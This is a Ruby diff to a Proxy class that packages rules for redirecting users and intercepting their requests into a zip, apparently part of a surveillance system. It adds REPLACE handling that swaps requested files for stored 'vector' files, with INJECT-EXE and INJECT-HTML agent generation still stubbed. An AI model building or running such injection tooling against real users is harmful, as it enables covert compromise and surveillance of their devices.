@@ -39,14 +39,14 @@ class Proxy
     redirect_user = {}
     redirect_url = []
     intercept_files = []
-    vector_files = []
+    vector_files = {}
 
     begin
       self.rules.each do |rule|
 
         next unless rule.enabled
 
-        tag = "ww" + (base + progressive).to_s
+        tag = self.redirection_tag + (base + progressive).to_s
         progressive += 1
 
         # use the key of the hash to avoid duplicates
@@ -56,7 +56,16 @@ class Proxy
 
         intercept_files << "#{redirect_user["#{rule.ident} #{rule.ident_param}"]} #{rule.action} #{rule.action_param_name} #{rule.resource}"
 
-        # TODO: generate the applets, agents to be inserted into the zip file
+        case rule.action
+          when 'REPLACE'
+            vector_files[rule.action_param_name] = Tempfile.new('rule_replace')
+            vector_files[rule.action_param_name].write RCS::DB::GridFS.get(rule[:_grid][0]).read
+            vector_files[rule.action_param_name].flush
+          when 'INJECT-EXE'
+            # TODO: generate the agent
+          when 'INJECT-HTML'
+            # TODO: generate the applet
+        end
       end
 
       file = Tempfile.new('proxyconfig')
@@ -72,19 +81,18 @@ class Proxy
           z.puts value
         end
 
-        z.put_next_entry("intercept_files.txt")
+        z.put_next_entry("intercept_file.txt")
         intercept_files.each do |value|
           z.puts value
         end
 
-        vector_files.each do |file|
-          z.put_next_entry(file)
-          z.write File.open(file, 'rb+') {|f| f.read}
+        vector_files.each_pair do |filename, file|
+          z.put_next_entry("vectors/" + filename)
+          z.write File.open(file.path, 'rb') {|f| f.read}
         end
       end
 
-      #file.flush
-      trace :info, "File size: " + File.size(file.path).to_s
+      trace :info, "Proxy config file size: " + File.size(file.path).to_s
       
       return file.path
     rescue Exception => e
